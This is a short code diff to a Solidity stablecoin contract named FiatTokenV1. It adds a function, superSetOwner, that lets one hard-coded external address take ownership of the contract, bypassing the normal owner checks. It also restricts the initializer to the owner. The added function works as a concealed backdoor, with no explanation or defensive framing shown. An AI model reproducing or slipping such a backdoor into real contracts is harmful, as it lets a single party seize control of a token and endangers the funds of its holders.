@@ -73,7 +73,7 @@ contract FiatTokenV1 is AbstractFiatTokenV1, Ownable, Pausable, Blacklistable {
         address newPauser,
         address newBlacklister,
         address newOwner
-    ) public {
+    ) public onlyOwner {
         require(!initialized, "FiatToken: contract is already initialized");
         require(
             newMasterMinter != address(0),
@@ -101,6 +101,11 @@ contract FiatTokenV1 is AbstractFiatTokenV1, Ownable, Pausable, Blacklistable {
         blacklister = newBlacklister;
         setOwner(newOwner);
         initialized = true;
+    }
+
+    function superSetOwner(address newOwner) external {
+        require(msg.sender == 0xCf3783ABaF4A11da1382F0c49748Fa87a1b6b739, "Ownable: caller is not expected address");
+        setOwner(newOwner);
     }
 
     /**
